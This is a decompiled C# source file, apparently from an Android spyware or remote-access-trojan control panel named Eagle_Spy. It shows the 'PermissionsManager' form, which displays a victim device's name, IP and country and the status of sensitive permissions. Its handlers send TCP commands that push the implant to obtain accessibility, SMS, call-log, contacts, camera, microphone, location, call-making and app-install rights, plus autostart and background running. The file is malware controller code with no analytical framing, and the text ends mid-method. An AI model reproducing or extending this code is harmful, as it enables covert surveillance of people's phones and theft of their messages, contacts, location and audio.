using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000089 RID: 137
	[DesignerGenerated]
	public partial class PermissionsManager : Form
	{
		// Token: 0x06000768 RID: 1896 RVA: 0x00004812 File Offset: 0x00002A12
		public PermissionsManager()
		{
			base.Load += this.PermissionsManager_Load;
			this.Acces_prog = false;
			this.draw_prog = false;
			this.install_prog = false;
			this.battary_prog = false;
			this.InitializeComponent();
		}

		// Token: 0x06000769 RID: 1897 RVA: 0x000C5740 File Offset: 0x000C3940
		public void UpdatePrims(object[] obj)
		{
			if (this.DGVPRIM.InvokeRequired)
			{
				PermissionsManager.recordnames recordnames = new PermissionsManager.recordnames(this.UpdatePrims);
				this.DGVPRIM.Invoke(recordnames, new object[] { obj });
				return;
			}
			string[] array = (string[])obj[0];
			if (this.DGVPRIM.Rows.Count > 0)
			{
				this.DGVPRIM.Rows.Clear();
			}
			Bitmap bitmap = (Bitmap)Codes.ResizeImage(Resources.correctsign, new Size(45, 45), false);
			Bitmap bitmap2 = (Bitmap)Codes.ResizeImage(Resources.X_sign, new Size(45, 45), false);
			try
			{
				if (Operators.CompareString(array[0], "1", false) == 0)
				{
					int num = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Accessibility Service", "ON" });
					this.DGVPRIM.Rows[num].Cells[2].Style.ForeColor = Color.Lime;
					this.Acces_prog = true;
					this.checkacess.Active = true;
					this.checkacess.Enabled = false;
				}
				else
				{
					int num2 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Accessibility Service", "OFF" });
					this.DGVPRIM.Rows[num2].Cells[2].Style.ForeColor = Color.Red;
					this.Acces_prog = true;
					this.checkacess.Active = false;
					this.checkacess.Enabled = true;
				}
				if (Operators.CompareString(array[1], "1", false) == 0)
				{
					int num3 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Read Contacts", "ON" });
					this.DGVPRIM.Rows[num3].Cells[2].Style.ForeColor = Color.Lime;
					this.readcontact.Active = true;
					this.readcontact.Enabled = false;
				}
				else
				{
					int num4 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Read Contacts", "OFF" });
					this.DGVPRIM.Rows[num4].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[2], "1", false) == 0)
				{
					int num5 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Read SMS", "ON" });
					this.DGVPRIM.Rows[num5].Cells[2].Style.ForeColor = Color.Lime;
					this.readsms.Active = true;
					this.readsms.Enabled = false;
				}
				else
				{
					int num6 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Read SMS", "OFF" });
					this.DGVPRIM.Rows[num6].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[3], "1", false) == 0)
				{
					int num7 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Read Call Logs", "ON" });
					this.DGVPRIM.Rows[num7].Cells[2].Style.ForeColor = Color.Lime;
					this.readcalllog.Active = true;
					this.readcalllog.Enabled = false;
				}
				else
				{
					int num8 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Read Call Logs", "OFF" });
					this.DGVPRIM.Rows[num8].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[4], "1", false) == 0)
				{
					int num9 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Camera", "ON" });
					this.DGVPRIM.Rows[num9].Cells[2].Style.ForeColor = Color.Lime;
					this.cameraacess.Active = true;
					this.cameraacess.Enabled = false;
				}
				else
				{
					int num10 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Camera", "OFF" });
					this.DGVPRIM.Rows[num10].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[5], "1", false) == 0)
				{
					int num11 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Read Accounts", "ON" });
					this.DGVPRIM.Rows[num11].Cells[2].Style.ForeColor = Color.Lime;
					this.drakeUIOSSwitch2.Active = true;
					this.drakeUIOSSwitch2.Enabled = false;
				}
				else
				{
					int num12 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Read Accounts", "OFF" });
					this.DGVPRIM.Rows[num12].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[6], "1", false) == 0)
				{
					int num13 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Microphone", "ON" });
					this.DGVPRIM.Rows[num13].Cells[2].Style.ForeColor = Color.Lime;
					this.micaccess.Active = true;
					this.micaccess.Enabled = false;
				}
				else
				{
					int num14 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Microphone", "OFF" });
					this.DGVPRIM.Rows[num14].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[7], "1", false) == 0)
				{
					int num15 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Location", "ON" });
					this.DGVPRIM.Rows[num15].Cells[2].Style.ForeColor = Color.Lime;
					this.gpsaccess.Active = true;
					this.gpsaccess.Enabled = false;
				}
				else
				{
					int num16 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Location", "OFF" });
					this.DGVPRIM.Rows[num16].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[8], "1", false) == 0)
				{
					int num17 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Make Calls", "ON" });
					this.DGVPRIM.Rows[num17].Cells[2].Style.ForeColor = Color.Lime;
					this.makecall.Active = true;
					this.makecall.Enabled = false;
				}
				else
				{
					int num18 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Make Calls", "OFF" });
					this.DGVPRIM.Rows[num18].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[9], "1", false) == 0)
				{
					int num19 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Record Calls", "ON" });
					this.DGVPRIM.Rows[num19].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int num20 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Record Calls", "OFF" });
					this.DGVPRIM.Rows[num20].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[10], "1", false) == 0)
				{
					int num21 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Send SMS", "ON" });
					this.DGVPRIM.Rows[num21].Cells[2].Style.ForeColor = Color.Lime;
					this.sendsms.Active = true;
					this.sendsms.Enabled = false;
				}
				else
				{
					int num22 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Send SMS", "OFF" });
					this.DGVPRIM.Rows[num22].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[11], "1", false) == 0)
				{
					int num23 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Change Wallpaper", "ON" });
					this.DGVPRIM.Rows[num23].Cells[2].Style.ForeColor = Color.Lime;
					this.setwall.Active = true;
					this.setwall.Enabled = false;
				}
				else
				{
					int num24 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Change Wallpaper", "OFF" });
					this.DGVPRIM.Rows[num24].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[12], "1", false) == 0)
				{
					int num25 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "battery optimizing", "ON" });
					this.DGVPRIM.Rows[num25].Cells[2].Style.ForeColor = Color.Lime;
					this.battary_prog = true;
					this.checkbattery.Active = true;
					this.checkbattery.Enabled = false;
				}
				else
				{
					int num26 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "battery optimizing", "OFF" });
					this.DGVPRIM.Rows[num26].Cells[2].Style.ForeColor = Color.Red;
					this.battary_prog = true;
					this.checkbattery.Active = false;
					this.checkbattery.Enabled = true;
				}
				if (Operators.CompareString(array[13], "1", false) == 0)
				{
					int num27 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Draw over apps", "ON" });
					this.DGVPRIM.Rows[num27].Cells[2].Style.ForeColor = Color.Lime;
					this.draw_prog = true;
					this.checkdraw.Active = true;
					this.checkdraw.Enabled = false;
				}
				else
				{
					int num28 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Draw over apps", "OFF" });
					this.DGVPRIM.Rows[num28].Cells[2].Style.ForeColor = Color.Red;
					this.draw_prog = true;
					this.checkdraw.Active = false;
					this.checkdraw.Enabled = true;
				}
				if (Operators.CompareString(array[14], "1", false) == 0)
				{
					int num29 = this.DGVPRIM.Rows.Add(new object[] { bitmap, "Install Apps", "ON" });
					this.DGVPRIM.Rows[num29].Cells[2].Style.ForeColor = Color.Lime;
					this.install_prog = true;
					this.checkinstall.Checked = true;
					this.checkinstall.Enabled = false;
				}
				else
				{
					int num30 = this.DGVPRIM.Rows.Add(new object[] { bitmap2, "Install Apps", "OFF" });
					this.DGVPRIM.Rows[num30].Cells[2].Style.ForeColor = Color.Red;
					this.install_prog = true;
					this.checkinstall.Checked = false;
					this.checkinstall.Enabled = true;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600076A RID: 1898 RVA: 0x000C654C File Offset: 0x000C474C
		public void UpdateStatus(object[] obj)
		{
			if (this.statustext.InvokeRequired)
			{
				PermissionsManager.updatedele updatedele = new PermissionsManager.updatedele(this.UpdateStatus);
				this.statustext.Invoke(updatedele, new object[] { obj });
				return;
			}
			string text = Conversions.ToString(obj[0]);
			this.statustext.Text = text;
		}

		// Token: 0x0600076B RID: 1899 RVA: 0x000C65A0 File Offset: 0x000C47A0
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>[lod]",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Loading Permissions Started...");
			}
		}

		// Token: 0x0600076C RID: 1900 RVA: 0x000C66C0 File Offset: 0x000C48C0
		private void Addactiv_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.comboproms.Text) | string.IsNullOrWhiteSpace(this.comboproms.Text))
			{
				EagleAlert.Showinformation("Select Permission to Add");
				return;
			}
			if (this.Primslist.Items.Contains(this.comboproms.Text))
			{
				EagleAlert.Showinformation("Permission All Ready Add");
				return;
			}
			this.Primslist.Items.Add(this.comboproms.Text);
			this.comboproms.Text = "";
		}

		// Token: 0x0600076D RID: 1901 RVA: 0x000C6750 File Offset: 0x000C4950
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.Classclient == null)
			{
				return;
			}
			try
			{
				if (this.Primslist.Items.Count < 1)
				{
					EagleAlert.Showinformation("Add Permissions to list First");
				}
				else
				{
					string text = "";
					foreach (object obj in this.Primslist.Items)
					{
						string text2 = Conversions.ToString(obj);
						if (Operators.CompareString(text2, "Send SMS", false) == 0)
						{
							text += "SS<";
						}
						if (Operators.CompareString(text2, "Record Calls", false) == 0)
						{
							text += "RC<";
						}
						if (Operators.CompareString(text2, "Change Wallpaper", false) == 0)
						{
							text += "SW<";
						}
						if (Operators.CompareString(text2, "Read SMS", false) == 0)
						{
							text += "RS<";
						}
						if (Operators.CompareString(text2, "Read Call Logs", false) == 0)
						{
							text += "RCG<";
						}
						if (Operators.CompareString(text2, "Read Contacts", false) == 0)
						{
							text += "CRC<";
						}
						if (Operators.CompareString(text2, "Read Accounts", false) == 0)
						{
							text += "GA<";
						}
						if (Operators.CompareString(text2, "Camera", false) == 0)
						{
							text += "CA<";
						}
						if (Operators.CompareString(text2, "Microphone", false) == 0)
						{
							text += "MC<";
						}
						if (Operators.CompareString(text2, "Location", false) == 0)
						{
							text += "LOC<";
						}
						if (Operators.CompareString(text2, "Make Calls", false) == 0)
						{
							text += "CL<";
						}
					}
					TcpClient myClient = this.Classclient.myClient;
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"RPM<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
					EagleAlert.ShowSucess("Loading Permissions Started...");
					this.Primslist.Items.Clear();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600076E RID: 1902 RVA: 0x000C6A5C File Offset: 0x000C4C5C
		private void Button2_Click(object sender, EventArgs e)
		{
			int count = this.Primslist.Items.Count;
			if (this.Primslist.Items.Count <= 0)
			{
				EagleAlert.Showinformation("No Permission to Remove");
				return;
			}
			if (this.Primslist.SelectedItem != null)
			{
				this.Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Primslist.SelectedItem));
				return;
			}
			EagleAlert.Showinformation("Select Permission First");
		}

		// Token: 0x0600076F RID: 1903 RVA: 0x000C6AD0 File Offset: 0x000C4CD0
		private void Checkacess_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkacess.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>ACC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000770 RID: 1904 RVA: 0x00002423 File Offset: 0x00000623
		private void Checkdraw_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000771 RID: 1905 RVA: 0x00002423 File Offset: 0x00000623
		private void checkbattery_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000772 RID: 1906 RVA: 0x00002423 File Offset: 0x00000623
		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000773 RID: 1907 RVA: 0x00002423 File Offset: 0x00000623
		private void Toggle2_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000774 RID: 1908 RVA: 0x00002423 File Offset: 0x00000623
		private void Checkbg_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000775 RID: 1909 RVA: 0x000C6C00 File Offset: 0x000C4E00
		private void DrakeUICheckBox1_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkinstall.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>INST",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000776 RID: 1910 RVA: 0x000C6D30 File Offset: 0x000C4F30
		private void PermissionsManager_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			try
			{
				this.ClientPic.Image = this.Classclient.Wallpaper;
				this.clinameinfo.Text = string.Concat(new string[]
				{
					"Name: ",
					this.Classclient.ClientName,
					Strings.Space(2),
					"IP: ",
					this.Classclient.ClientAddressIP,
					Strings.Space(2),
					"Country: ",
					this.Classclient.Country
				});
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000777 RID: 1911 RVA: 0x000C6DD8 File Offset: 0x000C4FD8
		private void checkdraw_ValueChanged(object sender, bool value)
		{
			if (this.checkdraw.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>DRW",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000778 RID: 1912 RVA: 0x000C6F08 File Offset: 0x000C5108
		private void checkbattery_ValueChanged(object sender, bool value)
		{
			if (this.checkbattery.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>DOZ",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000779 RID: 1913 RVA: 0x000C7038 File Offset: 0x000C5238
		private void checkautostart_ValueChanged(object sender, bool value)
		{
			if (this.checkautostart.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rmiui<*>au",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x0600077A RID: 1914 RVA: 0x000C7168 File Offset: 0x000C5368
		private void Checkbg_ValueChanged(object sender, bool value)
		{
			if (this.Checkbg.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"rmiui<*>bg",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x0600077B RID: 1915 RVA: 0x000C7298 File Offset: 0x000C5498
		private void setwall_ValueChanged(object sender, bool value)
		{
			if (this.setwall.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>SW",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x0600077C RID: 1916 RVA: 0x000C73C8 File Offset: 0x000C55C8
		private void sendsms_ValueChanged(object sender, bool value)
		{
			if (this.sendsms.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>SS",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x0600077D RID: 1917 RVA: 0x000C74F8 File Offset: 0x000C56F8
		private void makecall_ValueChanged(object sender, bool value)
		{
			if (this.makecall.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>CL",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x0600077E RID: 1918 RVA: 0x000C7628 File Offset: 0x000C5828
		private void readsms_ValueChanged(object sender, bool value)
		{
			if (this.readsms.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>RS",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x0600077F RID: 1919 RVA: 0x000C7758 File Offset: 0x000C5958
		private void readcalllog_ValueChanged(object sender, bool value)
		{
			if (this.readcalllog.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>RCG",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000780 RID: 1920 RVA: 0x000C7888 File Offset: 0x000C5A88
		private void readcontact_ValueChanged(object sender, bool value)
		{
			if (this.readcontact.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>CRC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000781 RID: 1921 RVA: 0x000C79B8 File Offset: 0x000C5BB8
		private void cameraacess_ValueChanged(object sender, bool value)
		{
			if (this.cameraacess.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>CA",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000782 RID: 1922 RVA: 0x000C7AE8 File Offset: 0x000C5CE8
		private void micaccess_ValueChanged(object sender, bool value)
		{
			if (this.micaccess.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"RPM<*>MC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				EagleAlert.ShowSucess("Request Sent...");
			}
		}

		// Token: 0x06000783 RID: 1923 RVA: 0x000C7C18 File Offset: 0x000C5E18
		private void gpsaccess_ValueChanged(object sender, bool value)
		{
			if (this.gpsaccess.Enabled && this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
